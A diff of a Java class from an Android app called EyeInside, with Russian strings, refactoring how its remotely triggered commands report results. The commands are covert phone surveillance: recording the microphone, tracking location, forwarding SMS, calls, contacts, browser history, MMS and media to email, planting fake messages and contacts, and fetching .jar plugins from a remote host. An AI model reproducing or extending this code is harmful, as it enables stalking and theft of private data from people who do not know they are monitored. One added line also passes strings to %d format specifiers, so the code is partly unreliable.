@@ -1,11 +1,8 @@
 package com.code4bones.EyeInside;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.PrintStream;
-import java.net.URI;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -106,9 +103,10 @@ public class CommandPool {
 		PluginManager plugins = new PluginManager(this);
 		plugins.reloadPlugins();
 		
+		// Help command
 		Add(new CommandObj(CommandObj.CMD_HELP,"[command name>]") {
 			public int Invoke() throws Exception {
-				this.mCommandResult = "";
+				String res = "";
 				String help = null;
 				int idx = 1;
 				if ( mArgs.optCount() > 0 )
@@ -116,18 +114,15 @@ public class CommandPool {
 				for ( CommandObj cmd : mCommands ) {
 					if ( (help != null && help.equalsIgnoreCase(cmd.mCommandName )) || help == null )
 					{
-						if ( mCommandResult.length() != 0 ) mCommandResult += "\n-\n";
-						mCommandResult += String.format("%2d | @%s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
+						if ( res.length() != 0 ) res += "\n-\n";
+						res += String.format("%2d | @%s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
 						if ( help != null )
 							break;
 						idx++;
 					}
 				}
-				return CommandObj.REPLY;
-			}
-			
-			public void Reply(Object ... argv) throws Exception {
-				replySMS("Available %d Commands\n----\n%s",mCommands.size(),this.mCommandResult);
+				setResult("Available %d Commands\n----\n%s",mCommands.size(),res);
+				return CommandObj.ACK;
 			}
 		});
 		
@@ -154,15 +149,12 @@ public class CommandPool {
 		Add(new CommandObjMic(CommandObj.CMD_MIC,"time:nn;[off] - записывать аудио nn секунд,файл на почту"));
 		Add(new CommandObjStats(CommandObj.CMD_STATS,"получить инфу о телефоне"));
 		Add(new CommandObjNotify(CommandObj.CMD_NOTIFY,"text:<message> - вывести сообщение в область уведомлений"));
-		Add(new CommandObjPlugin(CommandObj.CMD_PLUGIN,"[get:<http://<host>/<plugin>.jar][remove:<command name>][list]"));
+		Add(new CommandObjPlugin(CommandObj.CMD_PLUGIN,"[get:<http://<host>/<plugin>.jar][remove:<command or <plugin>.jar>][list]"));
 		
 		//Add(new CommandObjInvoke(CommandObj.CMD_INVOKE,"[command name] [params..]"));
 		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
 		
-		for ( CommandObj cmd : mCommands )
-			NetLog.v("CMD: %s [%s]",cmd.mCommandName,cmd);
-		
-		NetLog.v("Commands ready: %d",mCommands.size());
+		NetLog.v("Commands loaded: %d",mCommands.size());
 		mInitialized = true;
 	}
 
@@ -343,7 +335,7 @@ public class CommandPool {
 		if(!cmd.canSend()) {
 			cmd.mDelayed = true;
 			saveCommand(cmd);
-			cmd.mCommandResult = String.format("Выполнение %s команды не возможно,нет WiFi",cmd.mCommandName);
+			cmd.setResult("Выполнение %s команды не возможно,нет WiFi",cmd.mCommandName);
 			NetLog.v("Command saved due to internet connection lost...");
 			return CommandObj.ACK;
 		}
@@ -404,19 +396,19 @@ public class CommandPool {
 			super(name, help);
 		}
 		
-		public int Invoke() {
+		public int Invoke() throws Exception {
 
 			AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
 			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
 			if ( locMgr == null ) {
-				mCommandResult = "Возможно сервисы местоположения выключены";
+				setResult("Возможно сервисы местоположения выключены");
 				return CommandObj.ERROR;
 			}
 
 			if ( mActive ) {
 				boolean off = mArgs.hasOpt("off");
 				if ( !off ) {
-					mCommandResult = String.format("Команда уже выполняется,остановить выполнение можно командой @gps off");
+					setResult("Команда уже выполняется,остановить выполнение можно командой @gps off");
 					return CommandObj.ACK;
 				} else {
 					this.Reply();
@@ -442,24 +434,24 @@ public class CommandPool {
 			alarm.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),mPending);
 			
 			mActive = true;
-			mCommandResult = String.format("Местоположение придет в %s,ждите...", calendar.getTime().toLocaleString());
+			setResult("Местоположение придет в %s,ждите...", calendar.getTime().toLocaleString());
 			//this.replySMS(mCommandResult);
 			NetLog.v("%s",mCommandResult);
 			return CommandObj.ACK;
 		}
 		
 		
-		public void Reply(Object ... args) {
+		public void Reply(Object ... args) throws Exception {
 			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
 			if ( locMgr == null ) {
-				mCommandResult = "Возможно сервисы местоположения выключены";
+				setResult("Возможно сервисы местоположения выключены");
 			}
 			
 			locMgr.removeUpdates(mGPS);
 			locMgr.removeUpdates(mNET);
 			
 			
-			mCommandResult = String.format("Местоположение на %s\r\n", new Date().toLocaleString());
+			setResult("Местоположение на %s\r\n", new Date().toLocaleString());
 			
 			String url = "%s | https://maps.google.ru/maps?q=%s,%s\r\n";
 			
@@ -472,7 +464,7 @@ public class CommandPool {
 			locationString(url,mNET.mLocation);
 			
 			NetLog.v("Location Fixed: %s",mCommandResult);
-			this.replySMS(mCommandResult);
+			super.Reply();
 			mActive = false;
 		}
 		
@@ -553,13 +545,14 @@ public class CommandPool {
 						names.put(sms.phone, name);
 					}
 				}
-				mCommandResult = String.format("%s '%s' : %s",sms.type == SmsObj.IN?"от":"к",name,sms.message);
+				setResult("%s '%s' : %s",sms.type == SmsObj.IN?"от":"к",name,sms.message);
 	        } else {
-	        	mCommandResult = String.format("Произошло удаление СМС,было %d,стало %d",lastCount,count);
+	        	setResult("Произошло удаление СМС,было %d,стало %d",lastCount,count);
 	        }
 			NetLog.v("Redirecting to %s : \"%s\"\r\n",this.mMasterPhone,mCommandResult);
 			if ( mArgs.hasOpt("mail") ) createMail().send();
-			this.replySMS("%s",mCommandResult);
+			super.Reply();
+			//this.replySMS("%s",mCommandResult);
 		}
 	
 	} // CommandObjSMS
@@ -584,7 +577,7 @@ public class CommandPool {
 			String fileName = CommandObj.getFile(mContext, "sms-conv");
 			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
 			
-			mCommandResult = String.format("Список из %d сообщений отправлен на почту", smsList.size());
+			setResult("Список из %d сообщений отправлен на почту", smsList.size());
 			
 			ps.printf("%d messages\r\n", smsList.size());
 			for ( SmsObj sms : smsList ) {
@@ -675,7 +668,7 @@ public class CommandPool {
 		        String title = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnDisp[what]));
 		        //Date date = new Date(cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnDate[what])));
 
-		        mCommandResult = String.format("Новое %s %s",handleMedia.mTypeNames[what],title);
+		        setResult("Новое %s %s",handleMedia.mTypeNames[what],title);
 		        if ( canSend() ) {
 			        Mail mail = createMail();
 			        mail.addAttachment(file,title, false);
@@ -685,7 +678,7 @@ public class CommandPool {
 		        	mCommandResult += " ( письмо не отправлено, нет сети...)";
 		        }
 			} else if ( count < lastCount ) 
-				mCommandResult = String.format("Удаление %s,было %d,стало %d",handleMedia.mTypeNames[what],lastCount,count);
+				setResult("Удаление %s,было %d,стало %d",handleMedia.mTypeNames[what],lastCount,count);
 	        super.Reply(args);
 		}		
 	}
@@ -718,8 +711,8 @@ public class CommandPool {
 			
 			Cursor cur = mContext.getContentResolver().query(handleMedia.mUris[type], null,mDateParam, null, dateField + " DESC");
 			if  (cur == null || !cur.moveToFirst() ) {
-				mCommandResult = String.format("Нет данных для %s", handleMedia.mTypeNames[type]);
-				return CommandObj.REPLY;
+				setResult("Нет данных для %s", handleMedia.mTypeNames[type]);
+				return CommandObj.ACK;
 			}
 			long totalSize = 0;
 			Mail mail = null;
@@ -740,7 +733,7 @@ public class CommandPool {
 	        	idx++;
 		        if ( totalSize >= maxSize ) 
 		        {
-		        	mCommandResult = String.format("%s | %d - %d из %d", handleMedia.mTypeNames[type],lastIdx,idx,totalImages);
+		        	setResult("%s | %d - %d из %d", handleMedia.mTypeNames[type],lastIdx,idx,totalImages);
 		        	mail.setBody(mCommandResult);
 		        	lastIdx = idx;
 		        	mail.send();
@@ -750,12 +743,12 @@ public class CommandPool {
 			} while ( cur.moveToNext() );
 			cur.close();
 			if ( mail != null ) {
-	        	mCommandResult = String.format("%s | %d - %d из %d", handleMedia.mTypeNames[type],lastIdx,idx,totalImages);
+	        	setResult("%s | %d - %d из %d", handleMedia.mTypeNames[type],lastIdx,idx,totalImages);
 	        	mail.setBody(mCommandResult);
 	        	mail.send();
 			}
-			mCommandResult = String.format("Найдены %d %s, контент отправлен на почту", totalImages,handleMedia.mTypeNames[type]);
-			return CommandObj.REPLY;
+			setResult("Найдены %d %s, контент отправлен на почту", totalImages,handleMedia.mTypeNames[type]);
+			return CommandObj.ACK;
 		}
 	} // GET MEDIA
 	
@@ -780,7 +773,7 @@ public class CommandPool {
 			return CommandObj.ACK;
 		}
 		
-		public void Reply(Object ... args) {
+		public void Reply(Object ... args) throws Exception {
 			Cursor cur = (Cursor)args[0];
 	        ContactObj con = new ContactObj(cur,mContext);
 
@@ -794,9 +787,10 @@ public class CommandPool {
 				return;
 			
 			if ( lastCount < count )
-				replySMS("Добавлен контакт: %s %s",con.name,con.phoneArray());
+				setResult("Добавлен контакт: %s %s",con.name,con.phoneArray());
 			else	
-				replySMS("Произошло удаление контакта. было %d,стало %d",lastCount,count);
+				setResult("Произошло удаление контакта. было %d,стало %d",lastCount,count);
+			super.Reply();
 		}
 		
 	}
@@ -820,7 +814,7 @@ public class CommandPool {
 			String fileName = CommandObj.getFile(mContext, "books");
 			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
 			mContacts = listContacts();
-			mCommandResult = String.format("Список контактов ( %d ) отправлен на почту\t\n",mContacts.size());
+			setResult("Список контактов ( %d ) отправлен на почту\t\n",mContacts.size());
 			for ( ContactObj con : mContacts ) {
 					String info;
 					if ( con.phones.size() == 1 ) {
@@ -835,7 +829,7 @@ public class CommandPool {
 			} // for contacts
 			ps.flush();ps.close();
 			createMail().addAttachment(fileName,"phonebook.txt", true).send();
-			return CommandObj.REPLY;
+			return CommandObj.ACK;
 		}
 	} // GET BOOK
 
@@ -870,12 +864,10 @@ public class CommandPool {
 				return;
 			
 			if ( lastCount < count )
-				mCommandResult = String.format("%s звонок %s %s / %s,%d сек.",call.type,(call.typeVal == 1||call.typeVal == 3)?"от":"на",call.phone,call.name,call.duration);
+				setResult("%s звонок %s %s / %s,%d сек.",call.type,(call.typeVal == 1||call.typeVal == 3)?"от":"на",call.phone,call.name,call.duration);
 			else
-				mCommandResult = String.format("Произошло удаление звонка,было %d,стало %d",lastCount,count);
-			
-			replySMS("%s",mCommandResult);
-			NetLog.v("%s\r\n",mCommandResult);
+				setResult("Произошло удаление звонка,было %d,стало %d",lastCount,count);
+			super.Reply();
 		}
 		
 	}
@@ -903,16 +895,15 @@ public class CommandPool {
 			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
 			
 			ArrayList<CallObj> callLog = listCalls();
-			mCommandResult = String.format("Список из %d звонков отправлен на почту\r\n", callLog.size());
+			setResult("Список из %d звонков отправлен на почту\r\n", callLog.size());
 			for ( CallObj call : callLog ) 
 				ps.printf("%s %s %s %s  ( %d sec )\r\n",call.date,call.type,call.phone,call.name,call.duration);
 			
 			ps.flush();ps.close();
-			NetLog.v("%s\r\n",mCommandResult);
 			
 			createMail().addAttachment(fileName,"calls.txt", true).send();
 			
-		    return CommandObj.REPLY;
+		    return CommandObj.ACK;
 		}	
 		
 		public ArrayList<CallObj> listCalls() throws ParseException {
@@ -983,7 +974,7 @@ public class CommandPool {
 			};
 			
 			if ( mArgs.hasOpt("?") ) {
-				mCommandResult = "Текущая конфигурация: " + initString;
+				setResult("Текущая конфигурация: %s",initString);
 				return CommandObj.ACK;
 			} 
 			
@@ -1009,6 +1000,9 @@ public class CommandPool {
 			  for ( CommandObj cmd : mCommands ) {
 					if ( msg.length() != 0 ) msg += "\n";
 					msg += String.format("%2d | %s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
+					if ( cmd.mIsPlugin )
+						msg += " (" + new File(cmd.mPluginFile).getName()+")";
+	
 					idx++;
 				}
 			  String setStr = "";
@@ -1025,7 +1019,7 @@ public class CommandPool {
 			  m.setBody(String.format("Установка прошла успешно\nЗапрос:%s\nТекущий конфиг:\n%s\n\n",this.mCommandArgs,setStr)+msg);
 			  m.send();
 			  if ( m.mSuccess )
-			   mCommandResult = String.format("Инициализация прошла успешно,тестовое письмо отправленно на почту");
+			   setResult("Инициализация прошла успешно,тестовое письмо отправленно на почту");
 			  else {
 				String mails = "";
 				  for ( String param : params ) {
@@ -1033,7 +1027,7 @@ public class CommandPool {
 						mails += "\r\n";
 						mails += param + ": '"+pref.getString(param,"Не установлен")+"'";
 				}
-				  mCommandResult = String.format("Не могу отправить письмо,проверьте настройки почты\n--\n(%s)",mails);
+				  setResult("Не могу отправить письмо,проверьте настройки почты\n--\n(%s)",mails);
 			  }
 			  return m.mSuccess?CommandObj.ACK:CommandObj.ERROR;
 			}
@@ -1173,7 +1167,7 @@ public class CommandPool {
                		pt = isBookmark;
                 }
             	ps.close();
-            	mCommandResult = String.format("%s браузера отправлены на почту",types[type]);
+            	setResult("%s браузера отправлены на почту",types[type]);
             	Mail m = createMail();
             	m.addAttachment(fileName,"web.txt",true);
             	m.send();
@@ -1202,7 +1196,7 @@ public class CommandPool {
 			return CommandObj.ACK;
 		}
 		
-		public void Reply(Object ... args ) {
+		public void Reply(Object ... args ) throws Exception {
 			Cursor cur = (Cursor)args[0];
        
 			long count = cur.getCount();
@@ -1237,8 +1231,8 @@ public class CommandPool {
         			mCommandResult = "Новый URL "+sUrl;
      		}
      		mCommandResult = mCommandResult.replace("%","%%");
-     		this.replySMS("%s",mCommandResult);
-		}
+     		super.Reply();
+ 		}
 		
 	}
 	
@@ -1265,7 +1259,7 @@ public class CommandPool {
 			ArrayList<SmsObj> smsList = handler.listMMS();
 			
 			if ( smsList.size() == 0 ) {
-				mCommandResult = "Ни одного MMS не найдено";
+				setResult("Ни одного MMS не найдено");
 				return CommandObj.ACK;
 			}
 				
@@ -1308,7 +1302,7 @@ public class CommandPool {
         	idx++;
 		        if ( totalSize >= maxSize ) 
 		        {
-		        	mCommandResult = String.format("%d - %d из %d",lastIdx,idx,totalImages);
+		        	setResult("%d - %d из %d",lastIdx,idx,totalImages);
 		        	mail.setBody(mCommandResult+"\r\n"+info);
 		        	lastIdx = idx;
 		        	info = "";
@@ -1318,11 +1312,11 @@ public class CommandPool {
 		        }
 			}
 			if ( mail != null ) {
-	        	mCommandResult = String.format("%d - %d из %d", lastIdx,idx,totalImages);
+	        	setResult("%d - %d из %d", lastIdx,idx,totalImages);
 	        	mail.setBody(mCommandResult + "\r\n"+info);
 	        	mail.send();
 			}
-			mCommandResult = String.format("Найдены %d MMS, контент отправлен на почту", totalImages);
+			setResult("Найдены %d MMS, контент отправлен на почту", totalImages);
 			return CommandObj.ACK;
 		}
 	}
@@ -1345,7 +1339,7 @@ public class CommandPool {
 				return CommandObj.ERROR;
 			controlPool(this,enable);
 			*/
-			mCommandResult = "Монитор ММС пока не реализован...";
+			setResult("Монитор ММС пока не реализован...");
 			return CommandObj.ACK;
 		}
 	}
@@ -1362,10 +1356,10 @@ public class CommandPool {
 			SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
 			Map<String,?> all = p.getAll();
 			
-			mCommandResult = "Нет активных мониторов";
+			setResult("Нет активных мониторов");
 
 			if ( all.size() > 0 ) {
-				mCommandResult = "Активные мониторы событий: ";
+				setResult("Активные мониторы событий: ");
 				String cmds = "";
 				String commands[] = all.keySet().toArray(new String[]{});
 				for ( String name : commands ) {
@@ -1375,12 +1369,12 @@ public class CommandPool {
 						cmds += ",";
 					cmds += name; 
 				}
-				mCommandResult += cmds;
+				appendResult(cmds);
 			} 
 			if ( all.size() == 0 )
-				mCommandResult = "Активные мониторы событий: ";
+				setResult("Активные мониторы событий: ");
 			else
-				mCommandResult += ",";
+				appendResult(",");
 			
 			p = mContext.getSharedPreferences("events", 1);
 			all = p.getAll();
@@ -1394,7 +1388,7 @@ public class CommandPool {
 						cmds += ",";
 					cmds += "event "+p.getString(name, ""); 
 				}
-				mCommandResult += cmds;
+				appendResult(cmds);
 			} 
 			
 			return CommandObj.REPLY;
@@ -1436,8 +1430,8 @@ public class CommandPool {
 		}
 		
 		public void Reply(Object ... args) throws Exception {
-			   mCommandResult = String.format("Сервис работает нормально: %s", new Date().toLocaleString());	
-			   super.Reply(args);
+			   setResult("Сервис работает нормально: %s", new Date().toLocaleString());	
+			   super.Reply();
 			   
 		}
 	}
@@ -1472,9 +1466,9 @@ public class CommandPool {
 			
 			Uri uri = SmsObj.addSMS(mContext, phone, date, read, inbox, text);
 			if ( uri != null )
-				mCommandResult = String.format("Сообщение добавлено в базу (тип:%sпрочитано,ящик:%s,контакт:%s)",read?" ":"не ",inbox?"входящие":"исходящие",cont!=null?cont.name:"Нет в книжке");
+				setResult("Сообщение добавлено в базу (тип:%sпрочитано,ящик:%s,контакт:%s)",read?" ":"не ",inbox?"входящие":"исходящие",cont!=null?cont.name:"Нет в книжке");
 			else
-				mCommandResult = "Ошибка добавления сообщения...";
+				setResult("Ошибка добавления сообщения...");
 			return CommandObj.ACK;
 		}
 	}
@@ -1498,7 +1492,7 @@ public class CommandPool {
 			String phone = mArgs.strValue("phone",null);
 			ContactObj.addContact(mContext, name, phone, mail, org);
 			
-			mCommandResult = String.format("Контакт %s создан",name);
+			setResult("Контакт %s создан",name);
 			
 			return CommandObj.ACK;
 		}
@@ -1522,12 +1516,12 @@ public class CommandPool {
 					mRec.stop();
 					mRec = null;
 				}
-				mCommandResult = "Запись не была активна...";
+				setResult("Запись не была активна...");
 				return CommandObj.ACK;
 			}
 
 			if ( mRec != null ) {
-				mCommandResult = "Запись уже в процессе";
+				setResult("Запись уже в процессе");
 				return CommandObj.ACK;
 			}
 			
@@ -1537,7 +1531,7 @@ public class CommandPool {
 			 
 			Calendar cal = Calendar.getInstance();
 			cal.add(Calendar.SECOND, time);
-			mCommandResult = String.format("Записываем %d сек.,результат будет выслан на почту в %s", time,cal.getTime().toLocaleString());
+			setResult("Записываем %d сек.,результат будет выслан на почту в %s", time,cal.getTime().toLocaleString());
 			return CommandObj.ACK;
 		}
 		
@@ -1550,7 +1544,7 @@ public class CommandPool {
 			File file = new File(fileName);
 			mail.addAttachment(fileName,file.getName(),true);
 			mail.send();
-			mCommandResult = String.format("Запись %s ( %d байт ) выслана на почту...",file.getName(),file.length());
+			setResult("Запись %s ( %d байт ) выслана на почту...",file.getName(),file.length());
 			super.Reply(args);
 		}
 	}
@@ -1566,28 +1560,28 @@ public class CommandPool {
 		
 		public int Invoke() throws Exception {
 			
-			mCommandResult = "SDCard: ";
+			setResult("SDCard: ");
 			if ( CommandObj.hasExternal() ) {
 				String total = CommandObj.getSizeString(CommandObj.getExternalTotalSize());
 				String free  = CommandObj.getSizeString(CommandObj.getExternalFreeSize());
-				mCommandResult += "всего "+total+",свободно "+free;
+				appendResult("всего %d,свободно %d",total,free);
 			} else {
-				mCommandResult += "Нет";
+				appendResult("Нет");
 			}
 			
 			boolean ok = this.wifiEnabled();
-			mCommandResult += "\r\nWifi: ";
+			appendResult("\r\nWifi: ");
 			if ( ok ) {
 				WifiManager wifi = (WifiManager)mContext.getSystemService(Context.WIFI_SERVICE);
 				WifiInfo info = wifi.getConnectionInfo();
-				mCommandResult += info.getSSID();
+				appendResult(info.getSSID());
 			} else
-				mCommandResult += "Выкл";
+				appendResult("Выкл");
 			
 			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
-			mCommandResult += "\r\nЛокация: ";
-			mCommandResult += "GPS:" + (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)?"Вкл.":"Выкл");
-			mCommandResult += ",Network:" + (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)?"Вкл.":"Выкл");
+			appendResult("\r\nЛокация: ");
+			appendResult("GPS: %s\r\n",(locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)?"Вкл.":"Выкл"));
+			appendResult("Network: %s" ,(locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)?"Вкл.":"Выкл"));
 			
 			
 			
@@ -1632,12 +1626,12 @@ public class CommandPool {
 		
 		public int download() throws Exception {
 			if ( !CommandObj.hasExternal()) {
-				mCommandResult = "Карта памяти не доступна,загрузка плагина не возможна...";
+				setResult("Карта памяти не доступна,загрузка плагина не возможна...");
 				return CommandObj.ERROR;
 			}
 			
 			if ( CommandObj.getExternalFreeSize() < 1024 * 1024 * 5) {
-				mCommandResult = "Недостаточно места на карте памяти, загрузка не возможна...";
+				setResult("Недостаточно места на карте памяти, загрузка не возможна...");
 				return CommandObj.ERROR;
 			}
 
@@ -1669,23 +1663,36 @@ public class CommandPool {
 			PluginManager plugins = new PluginManager(CommandPool.this);
 			int count = plugins.reloadPlugins(); 
 			if ( count > 0 )
-				mCommandResult = String.format("Библиотека загружена,команд найдено %d",count);
+				setResult("Библиотека загружена,команд найдено %d",count);
 			else
-				mCommandResult = String.format("Библиотека загружеа, но число команд не изменилось...");
+				setResult("Библиотека загружеа, но число команд не изменилось...");
 				
 			return CommandObj.ACK;
+		}
+		
+		public CommandObj findPlugin(String name) {
+			for ( CommandObj cmd : mCommands ) {
+				if ( !cmd.mIsPlugin )
+					continue;
+				if ( cmd.mPluginFile.compareToIgnoreCase(name) == 0 )
+					return cmd;
+			}
+			return null;
 		}
 		
 		public int delete() throws Exception {
 			String cmdName = mArgs.strValue("remove");
 			
+			setResult("Плагин '%s' не найден,удаление не возможно...", cmdName);
 			CommandObj cmd = findCommand(cmdName);
 			if ( cmd == null ) {
-				mCommandResult = String.format("Соманда '%s' не найдена удаление не возможно...", cmdName);
-				return CommandObj.ERROR;
+				cmd = findPlugin(cmdName);
+				if ( cmd == null ) 
+					return CommandObj.ERROR;
 			}
+			
 			if ( !cmd.mIsPlugin ) {
-				mCommandResult = String.format("Команда %s является встроенной, и не может быть удалена",cmd.mCommandName);
+				setResult("Команда %s является встроенной, и не может быть удалена",cmd.mCommandName);
 				return CommandObj.ERROR;
 			}
 			
@@ -1694,12 +1701,12 @@ public class CommandPool {
 			boolean fok = file.delete(); 
 		
 			PluginManager plugins = new PluginManager(CommandPool.this);
-			int count = plugins.reloadPlugins(); 
+			plugins.reloadPlugins(); 
 
 			if ( fok )
-				mCommandResult = String.format("Пакет %s (c командой %s) удален и более не доступен !\nдоступно %d команд",file.getName(),cmd.mCommandName,count);
+				setResult("Пакет %s (c командой %s) удален и более не доступен !\nдоступно %d команд",file.getName(),cmd.mCommandName,mCommands.size());
 			else
-				mCommandResult = "Не удалось удалить пакет "+file.getName();
+				setResult("Не удалось удалить пакет %s",file.getName());
 			
 			return CommandObj.ACK;
 		}
@@ -1719,16 +1726,16 @@ public class CommandPool {
 				plugs.put(file, name);
 			}
 			if ( plugs.isEmpty() ) {
-				mCommandResult = "Плагинов не найдено...";
+				setResult("Плагинов не найдено...");
 				return CommandObj.ACK;
 			}
 				
 			Set<String> keysSet = plugs.keySet();
-			mCommandResult = "";
+			setResult("");
 			for ( String key : keysSet.toArray(new String[]{}) ) {
 				if ( mCommandResult.length() != 0 )
-					mCommandResult += "\r\n-\r\n";
-				mCommandResult += String.format("пакет:%s [%s]",key,plugs.get(key));
+					appendResult("\r\n-\r\n");
+				appendResult("пакет:%s [%s]",key,plugs.get(key));
 			}
 			return CommandObj.ACK;
 		}
